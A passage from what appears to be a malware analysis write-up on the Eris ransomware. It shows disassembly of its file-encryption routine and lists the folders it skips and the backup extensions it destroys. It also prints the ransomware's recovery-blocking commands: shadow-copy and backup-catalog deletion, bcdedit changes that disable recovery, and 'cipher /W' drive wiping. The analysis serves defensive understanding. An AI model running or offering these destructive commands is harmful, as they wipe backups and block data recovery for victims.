<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec9f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">7</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feca7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fecab</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fecaf</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Utils.Execute</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fecb4</span>  <span style="color:#66d9ef">jmp</span> <span style="color:#ae81ff">0x5fe966</span>
</code></pre></div><h3 id="encrypting-files">Encrypting files</h3>
<p>The malware walks all the disks and encrypts the files. It can perform this
process &ldquo;multithreaded&rdquo; if a command line flag is given. In this case, it uses
one <em>Go</em> routine for each drive. The malware skips any folders containing the
following strings:</p>
<ul>
<li>windows</li>
<li>windows.old</li>
<li>system volume information</li>
<li>$recycle.bin</li>
<li>program files</li>
<li>program files (x86)</li>
<li>programdata</li>
<li>i386</li>
<li>amd64</li>
<li>sysvol</li>
</ul>
<p>It also skip the following files:</p>
<ul>
<li>autoexec.bat</li>
<li>boot.ini</li>
<li>ntdetect.com</li>
<li>msdos.sys</li>
<li>io.sys</li>
<li>pagefile.sys</li>
<li>ntldr</li>
<li>config.sys</li>
<li>ntuser.dat</li>
</ul>
<p>If the file has <code>_FLAG_ENCRYPTED_</code> at the end of the file, it is skipped.</p>
<p>Eris overwrites and deletes backup files with the following file extensions:</p>
<pre><code>$$$, $db, 001, 001, 002, 003, 113, 73b, __a, __b, ab, aba, abbu, abf, abk, abu, abu1, acp, acr, adi, adi, aea, afi, arc, arc, as4, asd, ashbak, asv, asvx, ate, ati, ba6, ba7, ba8, bac, backup, backupdb, bak, bak, bak, bak, bak, bak2, bak3, bakx, bak~, bbb, bbz, bck, bckp, bcm, bdb, bff, bif, bifx, bk1, bk1, bkc, bkf, bkp, bkp, bkup, bkz, blend1, blend2, bm3, bmk, bookexport, bpa, bpb, bpm, bpn, bps, bup, bup, caa, cbk, cbs, cbu, cenon~, ck9, cmf, crds, csd, csm, da0, dash, dba, dbk, dbk, dim, diy, dna, dov, dpb, dsb, dss, fbc, fbf, fbk, fbk, fbu, fbw, fh, fhf, flka, flkb, fpsx, ftmb, ful, fwbackup, fza, fzb, gb1, gb2, gbp, gho, ghs, gs-bck, ibk, icbu, icf, inprogress, ipd, iv2i, j01, jbk, jdc, jpa, jps, kb2, lbf, lcb, llx, mbf, mbk, mbw, mdbackup, mddata, mdinfo, mem, mig, mpb, msim, mv_, mynotesbackup, nb7, nba, nbak, nbd, nbd, nbf, nbf, nbi, nbk, nbk, nbs, nbu, nco, nda, nfb, nfc, noy, npf, nps, nrbak, nrs, nwbak, obk, oeb, old, onepkg, ori, orig, oyx, paq, pba, pbb, pbd, pbf, pbf, pbj, pbx5script, pbxscript, pdb, pfi, pqb, pqb-backup, prv, psa, ptb, pvc, pvhd, qba.tlg, qbb, qbk, qbm, qbmb, qbmd, qbx, qic, qsf, qualsoftcode, quicken2015backup, quicken2016backup, quicken2017backup, quickenbackup, qv~, rbc, rbf, rbf, rbf, rbk, rbs, rdb, rgmb, rmbak, rrr, safenotebackup, sav, sbb, sbs, sbu, sdc, sim, sis, skb, sme, sn1, sn2, sna, sns, spf, spg, spi, sps, sqb, srr, stg, sv$, sv2i, tbk, tdb, tibkp, tib, tig, tis, tlg, tmp, tmp, tmr, trn, ttbk, uci, v2i, vbk, vbm, vbox-prev, vpcbackup, vrb, w01, walletx, wbb, wbcat, wbk, win, win, wjf, wpb, wspak, wx, xbk, xlk, yrcbck, zbfx, ~cw, vib, vkb
</code></pre><p>For each file a key is generated using <em>PBKDF2</em>. A random password is used with
the salt of <code>[0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8]</code> and 1000 iterations. The key is
encrypted with the victim&rsquo;s public key:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc13</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x87a654</span>] <span style="color:#75715e">; rngReader from crypto/rand package
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0053fc19</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x87a650</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc1f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc22</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc26</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc2a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#ae81ff">0x20</span> <span style="color:#75715e">; 32
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0053fc32</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">0x20</span> <span style="color:#75715e">; 32
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0053fc3a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>], <span style="color:#ae81ff">0x20</span> <span style="color:#75715e">; 32
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0053fc42</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.io.ReadAtLeast</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc47</span>  <span style="color:#66d9ef">nop</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc48</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">sym.type._8_uint8</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc4e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc51</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc56</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc5a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x6ce388</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc60</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x6ce38c</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc66</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc68</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">4</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc6b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_12ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc72</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc75</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">0x20</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc7d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0x20</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc85</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc89</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">8</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc91</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>], <span style="color:#ae81ff">8</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fc99</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_18h</span>], <span style="color:#ae81ff">0x3e8</span> <span style="color:#75715e">; 1000
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0053fca1</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_1ch</span>], <span style="color:#ae81ff">8</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fca9</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x68ae74</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcaf</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_20h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcb3</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.golang.org_x_crypto_pbkdf2.Key</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcb8</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_24h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcbc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_108h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcc3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_2ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcc7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_34h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fccb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_28h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fccf</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_30h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcd3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_12ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcda</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcdd</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">0x20</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fce5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0x20</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fced</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">arg_13ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcf4</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">ebp</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcf8</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">arg_140h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fcff</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">ebp</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fd03</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">arg_144h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fd0a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>], <span style="color:#66d9ef">ebp</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053fd0e</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Cryptography.RSAEncrypt</span>
</code></pre></div><p>The file is encrypted with Salsa20 using the generated key for the file.</p>
<p>=== Preventing recovery ===</p>
<p>After encryption of the files, the following commands are executed:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">taskkill.exe /f /im mysqld.exe
taskkill.exe /f /im sqlwriter.exe
taskkill.exe /f /im sqlserver.exe
taskkill.exe /f /im MSExchange*
taskkill.exe /f /im Microsoft.Exchange.*
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
wbadmin delete catalog -quiet
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
</code></pre></div><p>Code for executing the commands:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9a6</span>  <span style="color:#66d9ef">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9a8</span>  <span style="color:#66d9ef">jmp</span> <span style="color:#ae81ff">0x5fea59</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9ad</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_cch</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9b4</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, [<span style="color:#66d9ef">esp</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span>*<span style="color:#ae81ff">8</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x200</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9bb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9bd</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">4</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9c0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9c3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9c7</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convTstring</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9cc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9d0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_190h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9db</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_194h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9e6</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">sym.type.string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9ec</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_190h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9f3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_194h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe9fa</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x674630</span>] <span style="color:#75715e">; &#34;/C %s&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fea00</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea03</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">5</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea0b</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">var_190h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea12</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea16</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea1e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea26</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea2b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea2f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea33</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#ae81ff">0x674d1b</span>] <span style="color:#75715e">; &#34;cmd.exe&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fea39</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea3c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">7</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea44</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea48</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea4c</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Utils.Execute</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea51</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_cch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea58</span>  <span style="color:#66d9ef">inc</span> <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea59</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0xa</span> <span style="color:#75715e">; 10
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fea5c</span>  <span style="color:#66d9ef">jl</span> <span style="color:#ae81ff">0x5fe9ad</span>
</code></pre></div><p>For each drive letter, the malware executes <code>/C cipher /W:%DRIVE_LETTER%:</code> to
perform a secure wipe.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea62</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Utils.GetDrive</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea67</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea6a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_16ch</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea71</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea75</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_bch</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea7c</span>  <span style="color:#66d9ef">xor</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea7e</span>  <span style="color:#66d9ef">jmp</span> <span style="color:#ae81ff">0x5feb54</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea83</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_cch</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea8a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ebp</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea8d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea95</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.strings.ToUpper</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea9a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fea9e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feaa2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feaa5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feaa9</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convTstring</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feaae</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feab2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_190h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feabd</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_194h</span>], <span style="color:#ae81ff">0</span>
